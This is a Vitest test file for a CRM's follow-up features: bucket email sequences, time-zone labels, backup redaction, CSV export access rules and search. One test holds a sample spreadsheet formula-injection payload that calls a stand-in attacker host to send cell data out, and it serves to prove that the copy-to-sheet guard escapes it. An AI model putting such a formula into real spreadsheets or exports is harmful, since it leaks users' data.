import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from "vitest";
import { signSession } from "@/lib/auth/session";
import { runBucketSteps } from "@/lib/buckets/engine";
import { listAllMembers, listAllMembersCapped } from "@/lib/buckets/queries";
import { buildBackup } from "@/lib/export/backup";
import { loadQueue } from "@/lib/followup/overview";
import { niceTop } from "@/components/dashboard/WeeklyChart";
import { effectiveKind } from "@/components/dashboard/queueFilter";
import { downloadFile } from "@/components/followup/download";
import { tableText } from "@/lib/followup/dial";
import { matchesSearch } from "@/lib/followup/search";
import { createTestDb, insertUser, type TestDb } from "./helpers/db";

/**
 * Follow Up review fixes, each proved against the DATABASE where the bug lives there: a skipped sequence step must
 * not count as an email sent, every state's time zone gets a short label, our own touch excludes the merchant's reply,
 * the backup holds no merchant links, "opened" keeps an unfinished link, and the bucket actions move what they can and
 * name what they cannot.
 */

const jar = vi.hoisted(() => ({ token: "" }));
vi.mock("next/headers", () => ({
  cookies: async () => ({
    get: (name: string) =>
      name === "isaac_session" && jar.token ? { value: jar.token } : undefined,
  }),
  headers: async () => new Headers(),
}));
vi.mock("next/cache", () => ({ revalidatePath: () => undefined }));

const SECRET = "s".repeat(40);
let t: TestDb;
let rep: string;
let rep2: string;
let boss: string;
let buckets: typeof import("@/app/buckets-actions");
let route: typeof import("@/app/api/export/followup/route");

const one = async <T extends Record<string, unknown>>(sql: string, params: unknown[] = []) =>
  (await t.pool.query<T>(sql, params)).rows[0];
const all = async <T extends Record<string, unknown>>(sql: string, params: unknown[] = []) =>
  (await t.pool.query<T>(sql, params)).rows;
const bucket = async (key: string) =>
  (await one<{ id: string }>("select id from buckets where key = $1", [key]))!.id;
const as = async (id: string, email: string, role: "rep" | "manager") => {
  jar.token = await signSession({ userId: id, email, role, epoch: 0 }, SECRET);
};
let n = 0;
const client = async (
  owner: string,
  name: string,
  extra: { email?: string; state?: string } = {},
) => {
  n += 1;
  return (await one<{ id: string }>(
    "insert into clients (user_id, business_name, contact_name, phone, email, state) values ($1, $2, 'Mike', $3, $4, $5) returning id",
    [
      owner,
      name,
      `30555501${String(n).padStart(2, "0")}`,
      extra.email ?? `m${n}@x.com`,
      extra.state ?? "FL",
    ],
  ))!.id;
};
const enrol = (owner: string, id: string, bucketId: string) =>
  t.db.withUser(owner, (q) => q.query("select enroll_in_bucket($1, $2)", [id, bucketId]));
const live = (id: string) =>
  one<{ key: string | null; next_step: number; steps_sent: number; next_due_on: string | null }>(
    `select b.key, e.next_step, e.steps_sent, e.next_due_on::text as next_due_on
       from enrollments e join buckets b on b.id = e.bucket_id
      where e.client_id = $1 and e.stopped_at is null`,
    [id],
  );
const day = (d: number) => new Date(Date.UTC(2026, 10, 16 + d, 16, 0, 0)); // 11:00 ET

beforeAll(async () => {
  t = await createTestDb();
  const url = new URL(
    (t.pool as unknown as { options: { connectionString: string } }).options.connectionString,
  );
  process.env.DATABASE_URL = url.toString();
  process.env.SESSION_SECRET = SECRET;
  process.env.APP_URL = "https://crm.test";
  rep = await insertUser(t.pool, "rep@x.com", "America/New_York");
  rep2 = await insertUser(t.pool, "rep2@x.com", "America/New_York");
  boss = await insertUser(t.pool, "boss@x.com", "America/New_York");
  await t.pool.query("update app_users set role = 'manager', name = 'Boss' where id = $1", [boss]);
  await t.pool.query("update app_users set name = 'Sam Rep' where id = $1", [rep]);
  await t.pool.query("update shop_settings set postal_address = '1 Main St'");
  buckets = await import("@/app/buckets-actions");
  route = await import("@/app/api/export/followup/route");
});
afterAll(async () => {
  const g = globalThis as unknown as { __isaacPool?: { end(): Promise<void> } };
  await g.__isaacPool?.end();
  await t.drop();
});
afterEach(() => {
  vi.useRealTimers();
  vi.unstubAllGlobals();
});

describe("followup-1: a step that did not go out is not counted as sent", () => {
  it("a template that cannot send holds the step, says so once, and sends when it can", async () => {
    const tpl = (await one<{ id: string }>(
      "insert into templates (owner_id, name, subject, body, approved) values ($1, 'Held', 'Hey {first_name}', 'Body for {business}', false) returning id",
      [rep],
    ))!.id;
    const mine = (await one<{ id: string }>(
      "insert into buckets (name, owner_id, rule) values ('Held bucket', $1, 'manual') returning id",
      [rep],
    ))!.id;
    await t.pool.query(
      "insert into bucket_steps (bucket_id, step_no, day_offset, template_id, action) values ($1, 1, 0, $2, 'email'), ($1, 2, 1, null, 'call')",
      [mine, tpl],
    );
    const id = await client(rep, "Held Co");
    await enrol(rep, id, mine);
    await t.pool.query(
      "update enrollments set entered_at = $2, next_due_on = '2026-11-16' where client_id = $1",
      [id, day(0).toISOString()],
    );
    await runBucketSteps({ db: t.db, now: day(0), appUrl: "https://crm.test" });
    expect(await live(id)).toEqual({
      key: null,
      next_step: 1,
      steps_sent: 0,
      next_due_on: "2026-11-17",
    });
    expect(await all("select 1 from outbox where client_id = $1", [id])).toHaveLength(0);
    const holds = () =>
      all("select 1 from activities where client_id = $1 and body like 'Bucket email on hold%'", [
        id,
      ]);
    expect(await holds()).toHaveLength(1);
    // the next day it is still held, still one line on the timeline
    await runBucketSteps({ db: t.db, now: day(1), appUrl: "https://crm.test" });
    expect(await live(id)).toMatchObject({
      next_step: 1,
      steps_sent: 0,
      next_due_on: "2026-11-18",
    });
    expect(await holds()).toHaveLength(1);
    // approved: the same step goes out and only now counts
    await t.pool.query("update templates set approved = true where id = $1", [tpl]);
    await runBucketSteps({ db: t.db, now: day(2), appUrl: "https://crm.test" });
    expect(await live(id)).toMatchObject({ next_step: 2, steps_sent: 1 });
    expect(await all("select 1 from outbox where client_id = $1", [id])).toHaveLength(1);
  });

  it("a merchant with no email moves on without adding to steps_sent", async () => {
    const id = await client(rep, "No Mail Co", { email: "" });
    await enrol(rep, id, await bucket("missing_app"));
    await t.pool.query(
      "update enrollments set entered_at = $2, next_due_on = '2026-11-16' where client_id = $1",
      [id, day(0).toISOString()],
    );
    await runBucketSteps({ db: t.db, now: day(0), appUrl: "https://crm.test" });
    expect(await live(id)).toMatchObject({ key: "missing_app", next_step: 2, steps_sent: 0 });
    expect(await all("select 1 from outbox where client_id = $1", [id])).toHaveLength(0);
  });
});

describe("followup-2: every state's time zone has a short label", () => {
  it("Michigan and Indiana read ET, Idaho MT, Arizona AZ", async () => {
    const want: Record<string, string> = {
      MI: "ET",
      IN: "ET",
      FL: "ET",
      ID: "MT",
      CO: "MT",
      AZ: "AZ",
      TX: "CT",
      CA: "PT",
      AK: "AKT",
      HI: "HT",
    };
    const bid = await bucket("interested");
    const byState: Record<string, string> = {};
    for (const state of Object.keys(want)) {
      const id = await client(rep2, `Zone ${state}`, { state });
      await enrol(rep2, id, bid);
      byState[id] = state;
    }
    const members = await t.db.withUser(rep2, (q) => listAllMembers(q));
    const got = Object.fromEntries(
      members.filter((m) => byState[m.client_id]).map((m) => [byState[m.client_id], m.tz_label]),
    );
    expect(got).toEqual(want);
  });
});

describe("followup-6: last touch ignores the merchant's own reply", () => {
  it("a reply yesterday does not move last_touch_at past our call", async () => {
    const id = await client(rep2, "Touch Co");
    await enrol(rep2, id, await bucket("interested"));
    await t.pool.query("delete from activities where client_id = $1", [id]);
    await t.pool.query(
      `insert into activities (user_id, client_id, kind, body, occurred_at) values
         ($1, $2, 'call', 'Spoke', now() - interval '5 days'),
         ($1, $2, 'email', 'Merchant replied: Re: hello', now() - interval '1 day')`,
      [rep2, id],
    );
    const members = await t.db.withUser(rep2, (q) => listAllMembers(q));
    const m = members.find((x) => x.client_id === id)!;
    const ageDays = (Date.now() - new Date(m.last_touch_at!).getTime()) / 86_400_000;
    expect(ageDays).toBeGreaterThan(4.9);
    expect(ageDays).toBeLessThan(5.1);
  });
});

describe("followup-3: the backup holds no link that opens a merchant's record", () => {
  it("clients come out without upload_token or application_token", async () => {
    const backup = await t.db.withUser(rep, (q) => buildBackup(q));
    expect(backup.tables.clients!.length).toBeGreaterThan(0);
    for (const row of backup.tables.clients!) {
      expect(row).not.toHaveProperty("upload_token");
      expect(row).not.toHaveProperty("application_token");
      expect(row).toHaveProperty("business_name");
    }
    expect(JSON.stringify(backup)).not.toMatch(/"(upload|application)_token"/);
  });
});

describe("followup-15: an unfinished application open survives a newer, finished upload open", () => {
  it("the merchant stays on Do this now as 'Opened the application'", async () => {
    const id = await client(rep, "Two Links Co");
    await t.pool.query(
      `insert into link_opens (client_id, kind, opened_at) values
         ($1, 'apply', now() - interval '3 hours'), ($1, 'upload', now() - interval '2 hours')`,
      [id],
    );
    await t.pool.query(
      `insert into documents (user_id, client_id, kind, filename, content_type, size_bytes, sha256, storage_key, source, created_at)
       values ($1, $2, 'other', 'stmt.pdf', 'application/pdf', 10, repeat('a', 64), 'k/two/stmt.pdf', 'upload_link', now() - interval '1 hour')`,
      [rep, id],
    );
    const queue = await t.db.withUser(rep, (q) => loadQueue(q, t.today));
    const item = queue.find((i) => i.clientId === id);
    expect(item).toMatchObject({
      kind: "opened",
      detail: "Opened the application, not signed yet",
    });
  });
});

describe("followup-9/10: move, remove, create and edit through the real actions", () => {
  it("move: the ones that can move do, the handed-off and another rep's are named, and the database agrees", async () => {
    await as(rep, "rep@x.com", "rep");
    const a = await client(rep, "Move A");
    const b = await client(rep, "Move B");
    const c = await client(rep2, "Move C");
    await t.pool.query("update clients set brought_in_at = now() where id = $1", [b]);
    await enrol(rep2, c, await bucket("interested"));
    const target = await bucket("missing_statements");
    const r = await buckets.moveToBucketAction({ clientIds: [a, b, c], bucketId: target });
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.data.moved).toBe(1);
    expect(r.data.skipped.map((s) => s.clientId).sort()).toEqual([b, c].sort());
    expect(r.data.skipped.find((s) => s.clientId === b)!.reason).toMatch(/handed off/);
    expect((await live(a))?.key).toBe("missing_statements");
    expect(await live(b)).toBeUndefined();
    expect((await live(c))?.key).toBe("interested");
    // nothing could move: an error, not a quiet success
    const none = await buckets.moveToBucketAction({ clientIds: [b], bucketId: target });
    expect(none).toEqual({ ok: false, error: expect.stringMatching(/handed off/) });
  });

  it("remove: stops the rep's own enrolment and leaves another rep's alone", async () => {
    await as(rep, "rep@x.com", "rep");
    const a = await client(rep, "Remove A");
    const c = await client(rep2, "Remove C");
    await enrol(rep, a, await bucket("interested"));
    await enrol(rep2, c, await bucket("interested"));
    const r = await buckets.removeFromBucketAction({ clientIds: [a, c] });
    expect(r.ok).toBe(true);
    expect(await live(a)).toBeUndefined();
    expect(
      (
        await one(
          "select stop_reason from enrollments where client_id = $1 order by entered_at desc",
          [a],
        )
      )?.stop_reason,
    ).toBe("removed");
    expect((await live(c))?.key).toBe("interested");
  });

  it("create: a duplicate name says so, 61 characters is refused, and only a manager shares", async () => {
    await as(rep, "rep@x.com", "rep");
    const made = await buckets.createBucketAction({ name: "Warm leads" });
    expect(made.ok).toBe(true);
    expect(await buckets.createBucketAction({ name: "warm LEADS" })).toEqual({
      ok: false,
      error: "You already have a bucket with that name",
    });
    expect((await buckets.createBucketAction({ name: "x".repeat(61) })).ok).toBe(false);
    expect(await buckets.createBucketAction({ name: "Shared try", shared: true })).toEqual({
      ok: false,
      error: "Only a manager can make a shared bucket",
    });
    expect(await all("select 1 from buckets where name = 'Shared try'")).toHaveLength(0);
    await as(boss, "boss@x.com", "manager");
    const shared = await buckets.createBucketAction({ name: "Everyone's", shared: true });
    expect(shared.ok).toBe(true);
    expect(
      (await one("select owner_id from buckets where name = 'Everyone''s'"))?.owner_id,
    ).toBeNull();
  });

  it("steps: a rep rewrites their own sequence, not a system bucket's, not another rep's", async () => {
    const tpl = (await one<{ id: string }>(
      "select id from templates where owner_id is null and approved limit 1",
    ))!.id;
    await as(rep, "rep@x.com", "rep");
    const mine = (await buckets.createBucketAction({ name: "Steps mine" })) as {
      ok: true;
      data: { id: string };
    };
    const steps = [
      { dayOffset: 0, templateId: tpl, action: "email" as const },
      { dayOffset: 3, templateId: null, action: "call" as const },
    ];
    expect((await buckets.setBucketStepsAction({ bucketId: mine.data.id, steps })).ok).toBe(true);
    expect(
      await all(
        "select step_no, day_offset, action from bucket_steps where bucket_id = $1 order by step_no",
        [mine.data.id],
      ),
    ).toEqual([
      { step_no: 1, day_offset: 0, action: "email" },
      { step_no: 2, day_offset: 3, action: "call" },
    ]);
    const system = await bucket("missing_app");
    const before = await all("select * from bucket_steps where bucket_id = $1 order by step_no", [
      system,
    ]);
    expect((await buckets.setBucketStepsAction({ bucketId: system, steps })).ok).toBe(false);
    expect(
      await all("select * from bucket_steps where bucket_id = $1 order by step_no", [system]),
    ).toEqual(before);
    await as(rep2, "rep2@x.com", "rep");
    expect(await buckets.setBucketStepsAction({ bucketId: mine.data.id, steps: [] })).toEqual({
      ok: false,
      error: "Bucket not found",
    });
    expect(
      await all("select 1 from bucket_steps where bucket_id = $1", [mine.data.id]),
    ).toHaveLength(2);
  });

  it("blast: queues for the rep's own merchants on the outbox and refuses a template that cannot send", async () => {
    await as(rep, "rep@x.com", "rep");
    const tpl = (await one<{ id: string }>(
      "select id from templates where owner_id is null and approved limit 1",
    ))!.id;
    const a = await client(rep, "Blast A");
    const c = await client(rep2, "Blast C");
    const r = await buckets.blastAction({ templateId: tpl, clientIds: [a, c] });
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.data.queued).toBe(1);
    expect(r.data.skipped).toEqual([{ clientId: c, reason: "not_found" }]);
    expect(await all("select lane from outbox where client_id = $1", [a])).toEqual([
      { lane: "blast" },
    ]);
    expect(await all("select 1 from outbox where client_id = $1", [c])).toHaveLength(0);
    const unapproved = (await one<{ id: string }>(
      "insert into templates (owner_id, name, subject, body, approved) values ($1, 'Raw', 's', 'b', false) returning id",
      [rep],
    ))!.id;
    expect((await buckets.blastAction({ templateId: unapproved, clientIds: [a] })).ok).toBe(false);
  });
});

describe("followup-9: the follow-up CSV route", () => {
  const get = (q: string) => route.GET(new Request(`https://crm.test/api/export/followup${q}`));

  it("a rep is refused, a bad id is 400, an unknown bucket is 404", async () => {
    await as(rep, "rep@x.com", "rep");
    expect((await get("?bucket=all")).status).toBe(403);
    await as(boss, "boss@x.com", "manager");
    expect((await get("?bucket=nope")).status).toBe(400);
    expect((await get("?bucket=00000000-0000-0000-0000-000000000000")).status).toBe(404);
    jar.token = "";
    expect((await get("?bucket=all")).status).toBe(401);
  });

  it("one bucket and every bucket download, leaving out do-not-contact, and say whether it was cut", async () => {
    await as(boss, "boss@x.com", "manager");
    const id = await client(boss, "Csv Keep Co");
    const dnc = await client(boss, "Csv Quiet Co");
    const bid = await bucket("interested");
    await enrol(boss, id, bid);
    await enrol(boss, dnc, bid);
    await t.pool.query("update clients set contact_status = 'dnc' where id = $1", [dnc]);
    const one1 = await get(`?bucket=${bid}`);
    expect(one1.status).toBe(200);
    expect(one1.headers.get("x-left-out")).toBe("1");
    expect(one1.headers.get("x-truncated")).toBe("0");
    const csv = await one1.text();
    expect(csv).toContain("Csv Keep Co");
    expect(csv).not.toContain("Csv Quiet Co");
    const every = await get("?bucket=all");
    expect(every.headers.get("content-disposition")).toContain("all-buckets");
    expect(await every.text()).toContain("Csv Keep Co");
  });
});

describe("followup-5: the all-buckets list says when it was cut", () => {
  it("not truncated below the cap", async () => {
    const r = await t.db.withUser(boss, (q) => listAllMembersCapped(q));
    expect(r.truncated).toBe(false);
    expect(r.members.length).toBeGreaterThan(0);
  });
});

describe("followup-4: Copy for a sheet cannot run a formula or break a row", () => {
  it("guards = + - @, flattens tabs and line breaks, keeps a plain phone and a normal name", () => {
    const text = tableText([
      {
        business: '=IMPORTXML("https://evil.example/"&A1,"//a")',
        contact: "@sum",
        phone: "(305) 555-0100",
      },
      { business: "Two\tTabs\nAnd Lines", contact: "-1+1", phone: "+13055550100" },
      { business: "Pizza Palace", contact: "Mike", phone: "(305) 555-0101" },
    ]);
    const lines = text.split("\n");
    expect(lines).toHaveLength(3);
    const cells = lines.map((l) => l.split("\t"));
    for (const row of cells) expect(row).toHaveLength(3);
    expect(cells[0]![0]!.startsWith("'=")).toBe(true);
    expect(cells[0]![1]).toBe("'@sum");
    expect(cells[1]).toEqual(["Two Tabs And Lines", "'-1+1", "+13055550100"]);
    expect(cells[2]).toEqual(["Pizza Palace", "Mike", "(305) 555-0101"]);
  });
});

describe("followup-7: a number typed with its country code finds a number stored without one", () => {
  const m = (phone: string) => ({
    business_name: "Alpha",
    contact_name: "Ann",
    email: "a@x.com",
    phone,
    state: "FL",
  });
  it.each(["(305) 555-0100", "305-555-0100", "3055550100", "+13055550100"])(
    "stored %s",
    (stored) => {
      for (const q of ["+1305555", "1-305-555-0100", "13055550100", "305-555", "3055550100"])
        expect(matchesSearch(m(stored), q)).toBe(true);
      expect(matchesSearch(m(stored), "1999555")).toBe(false);
      expect(matchesSearch(m(stored), "+1212555")).toBe(false);
    },
  );
});

describe("followup-8: the queue filter falls back to everything when its reason is gone", () => {
  it("keeps a present reason, drops a vanished one", () => {
    expect(effectiveKind("reply", new Set(["reply", "overdue"]))).toBe("reply");
    expect(effectiveKind("reply", new Set(["overdue"]))).toBe("all");
    expect(effectiveKind("reply", new Set())).toBe("all");
    expect(effectiveKind("all", new Set())).toBe("all");
  });
});

describe("followup-12: the weekly chart axis only shows whole numbers", () => {
  it("every top gives whole ticks, including the quiet weeks", () => {
    for (const max of [1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 25, 49, 51, 120, 999]) {
      const top = niceTop(max);
      expect(top).toBeGreaterThanOrEqual(max);
      expect(Number.isInteger(top / 2)).toBe(true);
    }
  });
});

describe("followup-11: the download link is in the page and the file URL outlives the click", () => {
  it("attaches the link, clicks it, and revokes the URL later", () => {
    vi.useFakeTimers();
    const events: string[] = [];
    const anchor = {
      href: "",
      download: "",
      click: () => events.push("click"),
      remove: () => events.push("remove"),
    };
    vi.stubGlobal("document", {
      createElement: () => anchor,
      body: { appendChild: () => events.push("append") },
    });
    const urls = {
      createObjectURL: () => "blob:x",
      revokeObjectURL: () => events.push("revoke"),
    };
    vi.stubGlobal("URL", Object.assign(URL, urls));
    downloadFile("a.csv", "x");
    expect(events).toEqual(["append", "click", "remove"]);
    vi.advanceTimersByTime(1000);
    expect(events).toEqual(["append", "click", "remove", "revoke"]);
  });
});
